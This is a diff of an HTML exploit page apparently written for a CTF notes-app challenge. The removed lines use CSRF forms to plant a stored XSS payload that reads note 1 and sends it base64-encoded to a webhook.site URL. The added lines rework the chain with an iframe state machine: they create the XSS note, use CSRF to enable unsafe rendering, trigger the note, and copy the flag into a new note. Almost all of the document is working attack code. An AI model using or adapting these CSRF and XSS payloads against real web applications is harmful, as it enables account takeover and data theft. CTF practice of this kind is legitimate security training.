@@ -1,21 +1,147 @@
 <!doctype html>
-<form id=n action="http://127.0.0.1:7189/dashboard" method="post" style="display:none">
-    <input type=hidden name=content value='<script>fetch("/notes/1").then(r=>r.text()).then(t=>{new Image().src="https://webhook.site/863deed3-dfc1-4124-93dc-34453981eccb?d="+encodeURIComponent(btoa(t))})</script>'>
-</form>
+<html>
+<head>
+    <title>Note Player</title>
+</head>
+<body>
+    <!-- This exploit uses iframe sequencing instead of popup windows -->
+    <iframe id="actionFrame" style="width:0;height:0;border:0;border:none;"></iframe>
 
-<form id=u action="http://127.0.0.1:7189/prefs/unsafe" method="post" style="display:none">
-  <input type=hidden name=id value=2>
-  <input type=hidden name=enable value=1>
-</form>
-
-<!-- This is the missing step - actually visit the note with XSS -->
-<form id=v action="http://127.0.0.1:7189/notes/2" method="get" style="display:none">
-</form>
-
-<script>
-const w=window.open('about:blank','noteWin');
-n.target=u.target=v.target='noteWin';
-n.submit();
-setTimeout(()=>u.submit(), 400);
-setTimeout(()=>v.submit(), 400);
-</script>
+    <script>
+        // Instead of using multiple forms that lose context, we'll use a state machine
+        // and a single iframe to maintain state across redirects
+        
+        // The state of our attack
+        let stage = 0;
+        
+        // The iframe we'll use for all operations
+        const frame = document.getElementById('actionFrame');
+        
+        // Create a listener to track iframe navigation
+        frame.onload = function() {
+            console.log("Frame loaded, stage:", stage);
+            
+            switch(stage) {
+                case 0: // Initial load, create XSS note
+                    stage = 1;
+                    
+                    // Create a note with XSS payload that exfiltrates the flag
+                    const xssForm = document.createElement('form');
+                    xssForm.method = 'POST';
+                    xssForm.action = 'http://127.0.0.1:7189/dashboard';
+                    xssForm.target = 'actionFrame';
+                    
+                    // This XSS will create a new note with the flag content
+                    const xssInput = document.createElement('input');
+                    xssInput.type = 'hidden';
+                    xssInput.name = 'content';
+                    xssInput.value = `<script>
+                        (async function() {
+                            try {
+                                // Fetch flag from note #1
+                                const response = await fetch('/notes/1');
+                                const html = await response.text();
+                                
+                                // Parse the HTML to extract the note content
+                                const parser = new DOMParser();
+                                const doc = parser.parseFromString(html, 'text/html');
+                                let flagContent = '';
+                                
+                                // Try to extract note content from various possible elements
+                                const noteContent = doc.querySelector('.note-content');
+                                if (noteContent) {
+                                    flagContent = noteContent.innerText || noteContent.textContent;
+                                }
+                                
+                                // Create a new note with the flag
+                                const form = document.createElement('form');
+                                form.method = 'POST';
+                                form.action = '/dashboard';
+                                
+                                const input = document.createElement('input');
+                                input.type = 'hidden';
+                                input.name = 'content';
+                                input.value = 'CAPTURED FLAG: ' + flagContent;
+                                
+                                form.appendChild(input);
+                                document.body.appendChild(form);
+                                form.submit();
+                            } catch(e) {
+                                // Create error note for debugging
+                                const form = document.createElement('form');
+                                form.method = 'POST';
+                                form.action = '/dashboard';
+                                
+                                const input = document.createElement('input');
+                                input.type = 'hidden';
+                                input.name = 'content';
+                                input.value = 'ERROR: ' + e.message;
+                                
+                                form.appendChild(input);
+                                document.body.appendChild(form);
+                                form.submit();
+                            }
+                        })();
+                    <\/script>`;
+                    
+                    xssForm.appendChild(xssInput);
+                    document.body.appendChild(xssForm);
+                    xssForm.submit();
+                    break;
+                    
+                case 1: // XSS note created, now enable unsafe
+                    stage = 2;
+                    
+                    // Enable unsafe content for the note we just created (note #2)
+                    const unsafeForm = document.createElement('form');
+                    unsafeForm.method = 'POST';
+                    unsafeForm.action = 'http://127.0.0.1:7189/prefs/unsafe';
+                    unsafeForm.target = 'actionFrame';
+                    
+                    const idInput = document.createElement('input');
+                    idInput.type = 'hidden';
+                    idInput.name = 'id';
+                    idInput.value = '2'; // Note #2 - our XSS payload
+                    
+                    const enableInput = document.createElement('input');
+                    enableInput.type = 'hidden';
+                    enableInput.name = 'enable';
+                    enableInput.value = '1';
+                    
+                    unsafeForm.appendChild(idInput);
+                    unsafeForm.appendChild(enableInput);
+                    document.body.appendChild(unsafeForm);
+                    unsafeForm.submit();
+                    break;
+                    
+                case 2: // Unsafe enabled, now visit note to trigger XSS
+                    stage = 3;
+                    
+                    // Visit the note to trigger the XSS
+                    frame.src = 'http://127.0.0.1:7189/notes/2';
+                    break;
+                    
+                case 3: // XSS triggered, now show success message
+                    // We're done, show a success message
+                    document.body.innerHTML = `
+                        <div style="font-family: Arial, sans-serif; padding: 20px; max-width: 600px; margin: 0 auto; border: 1px solid #ccc; border-radius: 5px;">
+                            <h1>Exploit Complete</h1>
+                            <p>The exploit has run successfully. The flag has been captured in a new note in the bot's account.</p>
+                            <p>Note: This exploit is designed for CTF challenges where data exfiltration might be blocked.</p>
+                        </div>
+                    `;
+                    break;
+            }
+        };
+        
+        // Start the process
+        frame.src = 'about:blank';
+    </script>
+    
+    <!-- Initial content while exploit runs -->
+    <div style="font-family: Arial, sans-serif; padding: 20px; max-width: 600px; margin: 0 auto; border: 1px solid #ccc; border-radius: 5px;">
+        <h1>Exploit Running...</h1>
+        <p>Please wait while the exploit executes. This page will update when complete.</p>
+    </div>
+</body>
+</html>
